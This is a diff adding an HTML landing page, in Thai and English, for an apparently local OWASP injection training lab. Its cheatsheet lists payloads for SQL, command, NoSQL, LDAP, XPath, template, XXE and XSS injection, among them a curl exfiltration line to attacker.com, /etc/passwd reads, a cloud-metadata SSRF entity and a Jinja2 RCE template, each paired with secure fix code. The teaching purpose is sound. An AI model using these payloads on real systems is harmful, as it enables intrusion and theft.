@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html lang="th">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>OWASP A05 — Injection Lab | Learning Environment</title>
+  <meta name="description"
+    content="สภาพแวดล้อมการเรียนรู้ OWASP A05 Injection — จำลองช่องโหว่และการป้องกัน SQL, Command, NoSQL, LDAP, XPath, Template, XML Injection" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap"
+    rel="stylesheet" />
+  <link rel="stylesheet" href="style.css" />
+  <script>
+    (function () {
+      const urlParams = new URLSearchParams(window.location.search);
+      let theme = urlParams.get('theme');
+      if (!theme) {
+        theme = localStorage.getItem('theme') || 'dark';
+      } else {
+        localStorage.setItem('theme', theme);
+      }
+      document.documentElement.setAttribute('data-theme', theme);
+    })();
+  </script>
+</head>
+
+<body>
+
+  <!-- ═══════════════ HEADER ═══════════════ -->
+  <header class="site-header">
+    <div class="header-glow"></div>
+    <div class="container">
+      <div class="header-inner">
+        <a href="#overview" class="logo">
+          <div class="logo-icon">
+            <svg class="logo-svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+              <path d="M9 10l3 2-3 2" />
+            </svg>
+          </div>
+          <div class="logo-text">
+            <span class="logo-title">Injection Lab</span>
+            <span class="logo-sub">OWASP Top 10 · A03:2021</span>
+          </div>
+        </a>
+        <nav class="header-nav">
+          <a href="#overview" class="nav-link">Overview</a>
+          <a href="#services" class="nav-link">Services</a>
+          <a href="#cheatsheet" class="nav-link">Cheatsheet</a>
+          <a href="#guide" class="nav-link">คู่มือ</a>
+        </nav>
+        <button id="theme-toggle" class="theme-btn" aria-label="Toggle Theme">
+          <span class="theme-icon-dark">🌙</span>
+          <span class="theme-icon-light">☀️</span>
+          <span class="theme-icon-lumio">🌅</span>
+        </button>
+        <div class="header-badge">
+          <span class="badge badge-warning">
+            <span class="badge-dot-pulse"></span>
+            Educational Only
+          </span>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- ═══════════════ HERO ═══════════════ -->
+  <section class="hero" id="overview">
+    <div class="hero-particles">
+      <div class="particle p1"></div>
+      <div class="particle p2"></div>
+      <div class="particle p3"></div>
+      <div class="particle p4"></div>
+      <div class="particle p5"></div>
+    </div>
+    <div class="container">
+      <div class="hero-content">
+        <div class="hero-label">
+          <span class="label-dot"></span>
+          OWASP Top 10 — A05:2021
+        </div>
+        <h1 class="hero-title">
+          <span class="title-gradient">Injection</span><br />
+          Learning Lab
+        </h1>
+        <p class="hero-desc">
+          สภาพแวดล้อมการเรียนรู้ช่องโหว่ <strong>Injection</strong> แบบครบวงจร<br />
+          จำลอง code ที่มีช่องโหว่และปลอดภัย ใช้หลายภาษา และหลาย service
+        </p>
+        <div class="hero-stats">
+          <div class="stat-item">
+            <span class="stat-number">7</span>
+            <span class="stat-label">Injection Types</span>
+          </div>
+          <div class="stat-divider"></div>
+          <div class="stat-item">
+            <span class="stat-number">3</span>
+            <span class="stat-label">Languages</span>
+          </div>
+          <div class="stat-divider"></div>
+          <div class="stat-item">
+            <span class="stat-number">2</span>
+            <span class="stat-label">Modes / Service</span>
+          </div>
+          <div class="stat-divider"></div>
+          <div class="stat-item">
+            <span class="stat-number">3</span>
+            <span class="stat-label">Databases</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════ WHAT IS INJECTION ═══════════════ -->
+  <section class="info-section">
+    <div class="container">
+      <div class="info-grid">
+        <div class="info-card glass">
+          <div class="info-icon">🔍</div>
+          <h3>Injection คืออะไร?</h3>
+          <p>เกิดขึ้นเมื่อแอปพลิเคชันส่ง <strong>untrusted data</strong> ไปยัง interpreter โดยไม่ผ่านการ sanitize
+            ทำให้ผู้โจมตีสามารถเปลี่ยนแปลง query หรือ command ที่ระบบจะ execute ได้</p>
+        </div>
+        <div class="info-card glass">
+          <div class="info-icon">⚡</div>
+          <h3>ผลกระทบ</h3>
+          <p>ข้อมูลรั่วไหล, bypass authentication, ลบหรือแก้ไขข้อมูลทั้งหมด, Remote Code Execution,
+            เข้าถึงระบบโดยไม่ได้รับอนุญาต</p>
+        </div>
+        <div class="info-card glass">
+          <div class="info-icon">🛡</div>
+          <h3>การป้องกัน</h3>
+          <p>ใช้ Parameterized Queries, Input Validation, Output Encoding, Principle of Least Privilege, และ WAF
+            เพื่อป้องกันการโจมตี</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════ SERVICES GRID ═══════════════ -->
+  <section class="services-section" id="services">
+    <div class="container">
+      <div class="section-header">
+        <h2 class="section-title">🧪 Lab Services</h2>
+        <p class="section-sub">แต่ละ service มี 2 โหมด: <span class="text-red">Vulnerable</span> และ <span
+            class="text-green">Secure</span></p>
+      </div>
+
+      <div class="services-grid">
+
+        <!-- ── SQL INJECTION ── -->
+        <div class="service-card glass" id="card-sql">
+          <div class="card-header">
+            <div class="card-icon" style="background: linear-gradient(135deg, #f97316, #ef4444);">🗄</div>
+            <div class="card-meta">
+              <span class="card-lang">Python · Flask · MySQL</span>
+              <span class="card-port">Port 5001</span>
+            </div>
+          </div>
+          <h3 class="card-title">SQL Injection</h3>
+          <p class="card-desc">ช่องโหว่ยอดนิยมที่สุด — ผู้โจมตีแทรก SQL code เข้าใน query เพื่อ bypass login,
+            ดึงข้อมูลลับ หรือทำลายฐานข้อมูล</p>
+          <div class="card-payloads">
+            <span class="payload-label">Payloads:</span>
+            <code class="payload-chip">' OR '1'='1</code>
+            <code class="payload-chip">' UNION SELECT 1,secret,3 FROM secrets--</code>
+            <code class="payload-chip">'; DROP TABLE users;--</code>
+          </div>
+          <div class="card-techniques">
+            <span class="tech-badge">Classic</span>
+            <span class="tech-badge">UNION</span>
+            <span class="tech-badge">Blind</span>
+            <span class="tech-badge">Error-based</span>
+          </div>
+          <div class="card-actions">
+            <a href="http://localhost:5001/vulnerable" target="_blank" id="sql-vuln-link" class="btn btn-danger">
+              <span>🔴</span> Vulnerable
+            </a>
+            <a href="http://localhost:5001/secure" target="_blank" id="sql-secure-link" class="btn btn-success">
+              <span>🟢</span> Secure
+            </a>
+          </div>
+        </div>
+
+        <!-- ── COMMAND INJECTION ── -->
+        <div class="service-card glass" id="card-cmd">
+          <div class="card-header">
+            <div class="card-icon" style="background: linear-gradient(135deg, #8b5cf6, #6366f1);">💻</div>
+            <div class="card-meta">
+              <span class="card-lang">PHP · Apache</span>
+              <span class="card-port">Port 5002</span>
+            </div>
+          </div>
+          <h3 class="card-title">Command Injection</h3>
+          <p class="card-desc">แอปส่ง user input ไปยัง OS shell โดยตรง ทำให้ผู้โจมตีรัน shell command
+            ได้อย่างอิสระบนเซิร์ฟเวอร์</p>
+          <div class="card-payloads">
+            <span class="payload-label">Payloads:</span>
+            <code class="payload-chip">127.0.0.1; cat /etc/passwd</code>
+            <code class="payload-chip">| whoami</code>
+            <code class="payload-chip">127.0.0.1 && id</code>
+          </div>
+          <div class="card-techniques">
+            <span class="tech-badge">Chaining</span>
+            <span class="tech-badge">Piping</span>
+            <span class="tech-badge">Blind</span>
+          </div>
+          <div class="card-actions">
+            <a href="http://localhost:5002/vulnerable.php" target="_blank" id="cmd-vuln-link" class="btn btn-danger">
+              <span>🔴</span> Vulnerable
+            </a>
+            <a href="http://localhost:5002/secure.php" target="_blank" id="cmd-secure-link" class="btn btn-success">
+              <span>🟢</span> Secure
+            </a>
+          </div>
+        </div>
+
+        <!-- ── NOSQL INJECTION ── -->
+        <div class="service-card glass" id="card-nosql">
+          <div class="card-header">
+            <div class="card-icon" style="background: linear-gradient(135deg, #10b981, #059669);">🍃</div>
+            <div class="card-meta">
+              <span class="card-lang">Node.js · Express · MongoDB</span>
+              <span class="card-port">Port 5003</span>
+            </div>
+          </div>
+          <h3 class="card-title">NoSQL Injection</h3>
+          <p class="card-desc">ใช้ MongoDB operator พิเศษ เช่น $gt, $ne เพื่อ bypass authentication
+            หรือดึงข้อมูลทั้งหมดโดยไม่ต้องรู้ password</p>
+          <div class="card-payloads">
+            <span class="payload-label">Payloads:</span>
+            <code class="payload-chip">{"$gt": ""}</code>
+            <code class="payload-chip">{"$ne": null}</code>
+            <code class="payload-chip">{"$regex": ".*"}</code>
+          </div>
+          <div class="card-techniques">
+            <span class="tech-badge">Operator</span>
+            <span class="tech-badge">Bypass Auth</span>
+            <span class="tech-badge">Regex</span>
+          </div>
+          <div class="card-actions">
+            <a href="http://localhost:5003/vulnerable" target="_blank" id="nosql-vuln-link" class="btn btn-danger">
+              <span>🔴</span> Vulnerable
+            </a>
+            <a href="http://localhost:5003/secure" target="_blank" id="nosql-secure-link" class="btn btn-success">
+              <span>🟢</span> Secure
+            </a>
+          </div>
+        </div>
+
+        <!-- ── LDAP INJECTION ── -->
+        <div class="service-card glass" id="card-ldap">
+          <div class="card-header">
+            <div class="card-icon" style="background: linear-gradient(135deg, #f59e0b, #d97706);">📁</div>
+            <div class="card-meta">
+              <span class="card-lang">Python · Flask · OpenLDAP</span>
+              <span class="card-port">Port 5004</span>
+            </div>
+          </div>
+          <h3 class="card-title">LDAP Injection</h3>
+          <p class="card-desc">แทรก LDAP metacharacters เข้าใน filter query เพื่อ bypass authentication หรือดึงข้อมูล
+            directory ทั้งหมด</p>
+          <div class="card-payloads">
+            <span class="payload-label">Payloads:</span>
+            <code class="payload-chip">*)(uid=*))(|(uid=*</code>
+            <code class="payload-chip">admin)(&)</code>
+            <code class="payload-chip">*</code>
+          </div>
+          <div class="card-techniques">
+            <span class="tech-badge">Filter Bypass</span>
+            <span class="tech-badge">Wildcard</span>
+            <span class="tech-badge">Blind</span>
+          </div>
+          <div class="card-actions">
+            <a href="http://localhost:5004/vulnerable" target="_blank" id="ldap-vuln-link" class="btn btn-danger">
+              <span>🔴</span> Vulnerable
+            </a>
+            <a href="http://localhost:5004/secure" target="_blank" id="ldap-secure-link" class="btn btn-success">
+              <span>🟢</span> Secure
+            </a>
+          </div>
+        </div>
+
+        <!-- ── XPATH INJECTION ── -->
+        <div class="service-card glass" id="card-xpath">
+          <div class="card-header">
+            <div class="card-icon" style="background: linear-gradient(135deg, #06b6d4, #0284c7);">📄</div>
+            <div class="card-meta">
+              <span class="card-lang">PHP · SimpleXML</span>
+              <span class="card-port">Port 5005</span>
+            </div>
+          </div>
+          <h3 class="card-title">XPath Injection</h3>
+          <p class="card-desc">แทรก XPath expression เพื่อ bypass authentication ในระบบที่เก็บ user ใน XML file
+            หรือดึงข้อมูลทั้งหมดออกมา</p>
+          <div class="card-payloads">
+            <span class="payload-label">Payloads:</span>
+            <code class="payload-chip">' or '1'='1</code>
+            <code class="payload-chip">'] | //* | //['</code>
+            <code class="payload-chip">' or 1=1 or ''='</code>
+          </div>
+          <div class="card-techniques">
+            <span class="tech-badge">Auth Bypass</span>
+            <span class="tech-badge">Data Extract</span>
+            <span class="tech-badge">Blind</span>
+          </div>
+          <div class="card-actions">
+            <a href="http://localhost:5005/vulnerable.php" target="_blank" id="xpath-vuln-link" class="btn btn-danger">
+              <span>🔴</span> Vulnerable
+            </a>
+            <a href="http://localhost:5005/secure.php" target="_blank" id="xpath-secure-link" class="btn btn-success">
+              <span>🟢</span> Secure
+            </a>
+          </div>
+        </div>
+
+        <!-- ── TEMPLATE INJECTION (SSTI) ── -->
+        <div class="service-card glass" id="card-ssti">
+          <div class="card-header">
+            <div class="card-icon" style="background: linear-gradient(135deg, #ec4899, #be185d);">🧩</div>
+            <div class="card-meta">
+              <span class="card-lang">Python · Flask · Jinja2</span>
+              <span class="card-port">Port 5006</span>
+            </div>
+          </div>
+          <h3 class="card-title">Template Injection (SSTI)</h3>
+          <p class="card-desc">Server-Side Template Injection — แทรก template expression เพื่อ execute Python code
+            บนเซิร์ฟเวอร์ได้โดยตรง (RCE)</p>
+          <div class="card-payloads">
+            <span class="payload-label">Payloads:</span>
+            <code class="payload-chip">{{7*7}}</code>
+            <code class="payload-chip">{{config.items()}}</code>
+            <code class="payload-chip">{{''.__class__.__mro__[1].__subclasses__()}}</code>
+          </div>
+          <div class="card-techniques">
+            <span class="tech-badge">RCE</span>
+            <span class="tech-badge">Config Leak</span>
+            <span class="tech-badge">Object Access</span>
+          </div>
+          <div class="card-actions">
+            <a href="http://localhost:5006/vulnerable" target="_blank" id="ssti-vuln-link" class="btn btn-danger">
+              <span>🔴</span> Vulnerable
+            </a>
+            <a href="http://localhost:5006/secure" target="_blank" id="ssti-secure-link" class="btn btn-success">
+              <span>🟢</span> Secure
+            </a>
+          </div>
+        </div>
+
+        <!-- ── XML / XXE ── -->
+        <div class="service-card glass" id="card-xxe">
+          <div class="card-header">
+            <div class="card-icon" style="background: linear-gradient(135deg, #64748b, #475569);">📦</div>
+            <div class="card-meta">
+              <span class="card-lang">PHP · libxml</span>
+              <span class="card-port">Port 5007</span>
+            </div>
+          </div>
+          <h3 class="card-title">XML / XXE Injection</h3>
+          <p class="card-desc">XML External Entity — ส่ง XML payload ที่มี external entity เพื่ออ่านไฟล์บนเซิร์ฟเวอร์
+            เช่น /etc/passwd หรือ SSRF</p>
+          <div class="card-payloads">
+            <span class="payload-label">Payloads:</span>
+            <code class="payload-chip">&lt;!DOCTYPE x [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;</code>
+            <code class="payload-chip">&lt;!ENTITY xxe SYSTEM "http://internal/"&gt;</code>
+          </div>
+          <div class="card-techniques">
+            <span class="tech-badge">File Read</span>
+            <span class="tech-badge">SSRF</span>
+            <span class="tech-badge">Blind XXE</span>
+          </div>
+          <div class="card-actions">
+            <a href="http://localhost:5007/vulnerable.php" target="_blank" id="xml-vuln-link" class="btn btn-danger">
+              <span>🔴</span> Vulnerable
+            </a>
+            <a href="http://localhost:5007/secure.php" target="_blank" id="xml-secure-link" class="btn btn-success">
+              <span>🟢</span> Secure
+            </a>
+          </div>
+        </div>
+
+        <!-- ── XSS INJECTION ── -->
+        <div class="service-card glass" id="card-xss">
+          <div class="card-header">
+            <div class="card-icon" style="background: linear-gradient(135deg, #f43f5e, #fb7185);">🎨</div>
+            <div class="card-meta">
+              <span class="card-lang">PHP · Apache</span>
+              <span class="card-port">Port 5008</span>
+            </div>
+          </div>
+          <h3 class="card-title">XSS (Cross-Site Scripting)</h3>
+          <p class="card-desc">Client-Side Script Injection — แทรกสคริปต์ JavaScript ที่เป็นอันตรายเพื่อรันบนเบราว์เซอร์ของผู้อื่น ขโมย Cookies หรือทำ Session Hijacking</p>
+          <div class="card-payloads">
+            <span class="payload-label">Payloads:</span>
+            <code class="payload-chip">&lt;script&gt;alert(1)&lt;/script&gt;</code>
+            <code class="payload-chip">&lt;img src=x onerror=alert(1)&gt;</code>
+            <code class="payload-chip">&lt;iframe src="javascript:alert(1)"&gt;</code>
+          </div>
+          <div class="card-techniques">
+            <span class="tech-badge">Reflected</span>
+            <span class="tech-badge">Stored</span>
+            <span class="tech-badge">DOM-based</span>
+          </div>
+          <div class="card-actions">
+            <a href="http://localhost:5008/vulnerable.php" target="_blank" id="xss-vuln-link" class="btn btn-danger">
+              <span>🔴</span> Vulnerable
+            </a>
+            <a href="http://localhost:5008/secure.php" target="_blank" id="xss-secure-link" class="btn btn-success">
+              <span>🟢</span> Secure
+            </a>
+          </div>
+        </div>
+
+      </div><!-- /services-grid -->
+    </div>
+  </section>
+
+  <!-- ═══════════════ CHEATSHEET ═══════════════ -->
+  <section class="cheatsheet-section" id="cheatsheet">
+    <div class="container">
+      <div class="section-header">
+        <h2 class="section-title">📋 Payload Cheatsheet</h2>
+        <p class="section-sub">รวม payload พื้นฐานสำหรับทดสอบแต่ละ injection</p>
+      </div>
+      <div class="cheatsheet-tabs">
+        <button class="tab-btn active" data-tab="sql" id="tab-sql">SQL</button>
+        <button class="tab-btn" data-tab="cmd" id="tab-cmd">Command</button>
+        <button class="tab-btn" data-tab="nosql" id="tab-nosql">NoSQL</button>
+        <button class="tab-btn" data-tab="ldap" id="tab-ldap">LDAP</button>
+        <button class="tab-btn" data-tab="xpath" id="tab-xpath">XPath</button>
+        <button class="tab-btn" data-tab="ssti" id="tab-ssti">SSTI</button>
+        <button class="tab-btn" data-tab="xxe" id="tab-xxe">XXE</button>
+        <button class="tab-btn" data-tab="xss" id="tab-xss">XSS</button>
+      </div>
+      <div class="cheatsheet-content">
+
+        <div class="tab-panel active" id="panel-sql">
+          <div class="cs-grid">
+            <div class="cs-block">
+              <h4>🔓 Authentication Bypass</h4>
+              <pre><code>' OR '1'='1
+' OR 1=1--
+' OR 'x'='x
+admin'--
+' OR ''='</code></pre>
+            </div>
+            <div class="cs-block">
+              <h4>🔗 UNION-based Extraction</h4>
+              <pre><code>' UNION SELECT 1,2,3--
+' UNION SELECT table_name,2,3 FROM information_schema.tables--
+' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username,password,3 FROM users--
+' UNION SELECT secret,2,3 FROM secrets--</code></pre>
+            </div>
+            <div class="cs-block">
+              <h4>⏱ Blind / Time-based</h4>
+              <pre><code>' AND SLEEP(5)--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(LENGTH(database())>5, SLEEP(3), 0)--</code></pre>
+            </div>
+            <div class="cs-block">
+              <h4>🛡 การแก้ไข (Secure)</h4>
+              <pre><code># Python - Parameterized Query
+cursor.execute("SELECT * FROM users WHERE username=%s AND password=%s",
+               (username, password))
+
+# PHP - PDO Prepared Statement
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
+$stmt->execute([$username, $password]);</code></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="tab-panel" id="panel-cmd">
+          <div class="cs-grid">
+            <div class="cs-block">
+              <h4>⛓ Command Chaining</h4>
+              <pre><code>127.0.0.1; cat /etc/passwd
+127.0.0.1 && whoami
+127.0.0.1 || id
+127.0.0.1 | ls -la /</code></pre>
+            </div>
+            <div class="cs-block">
+              <h4>🔒 Blind Command Injection</h4>
+              <pre><code>127.0.0.1; sleep 5
+127.0.0.1; curl http://attacker.com/?data=$(whoami)
+127.0.0.1; ping -c 5 attacker.com</code></pre>
+            </div>
+            <div class="cs-block">
+              <h4>🛡 การแก้ไข (Secure)</h4>
+              <pre><code># PHP - escape ก่อนส่ง shell
+$ip = escapeshellarg($_GET['ip']);
+$output = shell_exec("ping -c 3 $ip");
+
+# Python - ใช้ subprocess.run() กับ list
+result = subprocess.run(
+    ["ping", "-c", "3", ip],
+    capture_output=True, text=True, timeout=10
+)
+
+# หรือ whitelist validation
+if not re.match(r'^\d{1,3}(\.\d{1,3}){3}$', ip):
+    return "Invalid IP address"</code></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="tab-panel" id="panel-nosql">
+          <div class="cs-grid">
+            <div class="cs-block">
+              <h4>🔓 Operator-based Bypass</h4>
+              <pre><code>// JSON body
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": "admin", "password": {"$ne": "wrongpassword"}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+{"username": {"$where": "1==1"}}</code></pre>
+            </div>
+            <div class="cs-block">
+              <h4>🛡 การแก้ไข (Secure)</h4>
+              <pre><code>// Node.js - Sanitize operators
+const sanitize = require('mongo-sanitize');
+const clean = sanitize(req.body);
+
+// ตรวจสอบ type ก่อนใช้
+if (typeof username !== 'string') {
+  return res.status(400).json({error: 'Invalid input'});
+}
+
+// ใช้ schema validation (Mongoose)
+const UserSchema = new mongoose.Schema({
+  username: { type: String, required: true },
+  password: { type: String, required: true }
+});</code></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="tab-panel" id="panel-ldap">
+          <div class="cs-grid">
+            <div class="cs-block">
+              <h4>🔓 Filter Bypass</h4>
+              <pre><code>Username: *
+Username: admin)(&)
+Username: *)(uid=*))(|(uid=*
+Username: )(|(password=*)
+Password: *</code></pre>
+            </div>
+            <div class="cs-block">
+              <h4>🛡 การแก้ไข (Secure)</h4>
+              <pre><code># Python - escape LDAP special chars
+import ldap3
+
+def escape_ldap_filter(value):
+    # escape: \ * ( ) \x00
+    escape_chars = {'\\':'\\5c','*':'\\2a','(':'\\28',
+                    ')':'\\29','\x00':'\\00'}
+    for k, v in escape_chars.items():
+        value = value.replace(k, v)
+    return value
+
+# หรือใช้ ldap3.utils.conv.escape_filter_chars()
+from ldap3.utils.conv import escape_filter_chars
+safe_user = escape_filter_chars(username)</code></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="tab-panel" id="panel-xpath">
+          <div class="cs-grid">
+            <div class="cs-block">
+              <h4>🔓 XPath Auth Bypass</h4>
+              <pre><code>' or '1'='1
+' or 1=1 or ''='
+'] | //* | //['
+x' or 1=1 or 'a'='a</code></pre>
+            </div>
+            <div class="cs-block">
+              <h4>🛡 การแก้ไข (Secure)</h4>
+              <pre><code># Validate input ก่อน
+import re
+if not re.match(r'^[a-zA-Z0-9_]+$', username):
+    raise ValueError("Invalid username")
+
+# PHP - whitelist validation
+if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
+    die("Invalid input");
+}
+
+# หรือใช้ parameterized XPath library</code></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="tab-panel" id="panel-ssti">
+          <div class="cs-grid">
+            <div class="cs-block">
+              <h4>🧪 Detection</h4>
+              <pre><code>{{7*7}}          → 49 (Jinja2/Twig)
+${7*7}           → 49 (Freemarker)
+<%= 7*7 %>       → 49 (ERB)
+{{7*'7'}}        → 7777777 (Jinja2)</code></pre>
+            </div>
+            <div class="cs-block">
+              <h4>💣 Exploitation (Jinja2)</h4>
+              <pre><code>{{config.items()}}
+{{request.application.__globals__.__builtins__}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+
+# RCE via Popen
+{{''.class.mro()[1].subclasses()[X]('id',shell=True,stdout=-1).communicate()}}</code></pre>
+            </div>
+            <div class="cs-block">
+              <h4>🛡 การแก้ไข (Secure)</h4>
+              <pre><code># ❌ Vulnerable
+return render_template_string(f"Hello {name}!")
+
+# ✅ Secure - ใช้ template file
+return render_template('hello.html', name=name)
+
+# ✅ Secure - escape user input
+from markupsafe import escape
+safe_name = escape(name)
+return render_template_string("Hello {{ name }}!", name=safe_name)</code></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="tab-panel" id="panel-xxe">
+          <div class="cs-grid">
+            <div class="cs-block">
+              <h4>📖 Local File Read</h4>
+              <pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE data [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;</code></pre>
+            </div>
+            <div class="cs-block">
+              <h4>🌐 SSRF via XXE</h4>
+              <pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE data [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
+]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;</code></pre>
+            </div>
+            <div class="cs-block">
+              <h4>🛡 การแก้ไข (Secure)</h4>
+              <pre><code># PHP - ปิด external entities
+libxml_disable_entity_loader(true);
+$xml = simplexml_load_string($input, 'SimpleXMLElement',
+       LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);
+
+# Python - defusedxml
+import defusedxml.ElementTree as ET
+tree = ET.fromstring(xml_string)
+
+# หรือใช้ flag FEATURE_EXTERNAL_GENERAL_ENTITIES=False</code></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="tab-panel" id="panel-xss">
+          <div class="cs-grid">
+            <div class="cs-block">
+              <h4>💬 Reflected / Stored Payloads</h4>
+              <pre><code>&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert(document.cookie)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;a href="javascript:alert(1)"&gt;Click Me&lt;/a&gt;</code></pre>
+            </div>
+            <div class="cs-block">
+              <h4>🎯 DOM-based XSS</h4>
+              <pre><code># รับค่าจาก hash / search query แล้วสั่ง innerHTML ตรงๆ
+const name = new URLSearchParams(window.location.search).get('name');
+document.getElementById('output').innerHTML = name; // ❌ Vulnerable
+
+# แก้ไข (Secure DOM rendering):
+document.getElementById('output').textContent = name; // 🟢 Secure</code></pre>
+            </div>
+            <div class="cs-block">
+              <h4>🛡 การแก้ไข (Secure - Output Encoding)</h4>
+              <pre><code># PHP - htmlspecialchars (สำหรับ HTML Body)
+echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
+
+# Python Flask (Jinja2)
+# โดยปกติ Jinja2 จะ auto-escape อยู่แล้ว (ปลอดภัย)
+# ห้ามใช้ |safe หรือ render_template_string กับอินพุตดิบเด็ดขาด
+
+# Node.js Express (EJS/Pug)
+# EJS: ใช้ &lt;%= %&gt; เพื่อ escape (ปลอดภัย)
+# ห้ามใช้ &lt;%- %&gt; กับอินพุตของยูสเซอร์โดยตรง</code></pre>
+            </div>
+          </div>
+        </div>
+
+      </div><!-- /cheatsheet-content -->
+    </div>
+  </section>
+
+  <!-- ═══════════════ GUIDE ═══════════════ -->
+  <section class="guide-section" id="guide">
+    <div class="container">
+      <div class="section-header">
+        <h2 class="section-title">📚 คู่มือการใช้งาน</h2>
+        <p class="section-sub">วิธีเริ่มต้นใช้งาน Injection Lab</p>
+      </div>
+      <div class="guide-steps">
+        <div class="step-card glass">
+          <div class="step-num">01</div>
+          <div class="step-content">
+            <h4>เริ่มต้นระบบ</h4>
+            <pre><code>cd /path/to/Injection
+docker-compose up --build</code></pre>
+            <p>รอให้ทุก service เริ่มต้น (ประมาณ 1-2 นาที)</p>
+          </div>
+        </div>
+        <div class="step-card glass">
+          <div class="step-num">02</div>
+          <div class="step-content">
+            <h4>ทดสอบ Vulnerable Mode</h4>
+            <p>กดปุ่ม <span class="badge badge-danger">🔴 Vulnerable</span> ของแต่ละ service — ลองใส่ payload จาก
+              Cheatsheet เพื่อดูช่องโหว่</p>
+          </div>
+        </div>
+        <div class="step-card glass">
+          <div class="step-num">03</div>
+          <div class="step-content">
+            <h4>ศึกษาโค้ด</h4>
+            <p>เปิดดู source code ในโฟลเดอร์ <code>services/</code> เพื่อเปรียบเทียบ vulnerable vs secure code</p>
+          </div>
+        </div>
+        <div class="step-card glass">
+          <div class="step-num">04</div>
+          <div class="step-content">
+            <h4>ทดสอบ Secure Mode</h4>
+            <p>กดปุ่ม <span class="badge badge-success">🟢 Secure</span> — ลอง payload เดิม จะพบว่าถูก block ทั้งหมด
+              พร้อมคำอธิบายว่าป้องกันอย่างไร</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════ FOOTER ═══════════════ -->
+  <footer class="site-footer">
+    <div class="container">
+      <div class="footer-content">
+        <p class="footer-warning">
+          ⚠️ <strong>สำหรับการศึกษาเท่านั้น</strong> — ห้ามใช้ความรู้นี้โจมตีระบบที่ไม่ได้รับอนุญาต
+        </p>
+        <p class="footer-ref">
+          อ้างอิง: <a href="https://owasp.org/Top10/A03_2021-Injection/" target="_blank">OWASP Top 10 A03:2021
+            Injection</a>
+          · <a href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html"
+            target="_blank">OWASP Injection Prevention Cheat Sheet</a>
+        </p>
+        <p class="footer-copy">OWASP A05 Injection Lab · Built for Learning</p>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    // Tab switching for cheatsheet
+    const tabBtns = document.querySelectorAll('.tab-btn');
+    const tabPanels = document.querySelectorAll('.tab-panel');
+
+    tabBtns.forEach(btn => {
+      btn.addEventListener('click', () => {
+        const target = btn.dataset.tab;
+        tabBtns.forEach(b => b.classList.remove('active'));
+        tabPanels.forEach(p => p.classList.remove('active'));
+        btn.classList.add('active');
+        document.getElementById(`panel-${target}`).classList.add('active');
+      });
+    });
+
+    // Smooth scroll for nav links
+    document.querySelectorAll('a[href^="#"]').forEach(a => {
+      a.addEventListener('click', e => {
+        e.preventDefault();
+        const target = document.querySelector(a.getAttribute('href'));
+        if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      });
+    });
+
+    // Service card hover glow effect
+    document.querySelectorAll('.service-card').forEach(card => {
+      card.addEventListener('mousemove', e => {
+        const rect = card.getBoundingClientRect();
+        const x = e.clientX - rect.left;
+        const y = e.clientY - rect.top;
+        card.style.setProperty('--mouse-x', `${x}px`);
+        card.style.setProperty('--mouse-y', `${y}px`);
+      });
+    });
+
+    // Theme toggle logic
+    const themeToggleBtn = document.getElementById('theme-toggle');
+    
+    function updateOutboundLinks(themeName) {
+      document.querySelectorAll('.card-actions a').forEach(link => {
+        try {
+          const url = new URL(link.href);
+          url.searchParams.set('theme', themeName);
+          link.href = url.toString();
+        } catch (e) {}
+      });
+    }
+
+    themeToggleBtn.addEventListener('click', () => {
+      const currentTheme = document.documentElement.getAttribute('data-theme') || 'dark';
+      let newTheme = 'dark';
+      if (currentTheme === 'dark') {
+        newTheme = 'light';
+      } else if (currentTheme === 'light') {
+        newTheme = 'lumio';
+      } else {
+        newTheme = 'dark';
+      }
+      document.documentElement.setAttribute('data-theme', newTheme);
+      localStorage.setItem('theme', newTheme);
+      updateOutboundLinks(newTheme);
+    });
+
+    // Run initially
+    const initialTheme = document.documentElement.getAttribute('data-theme') || 'dark';
+    updateOutboundLinks(initialTheme);
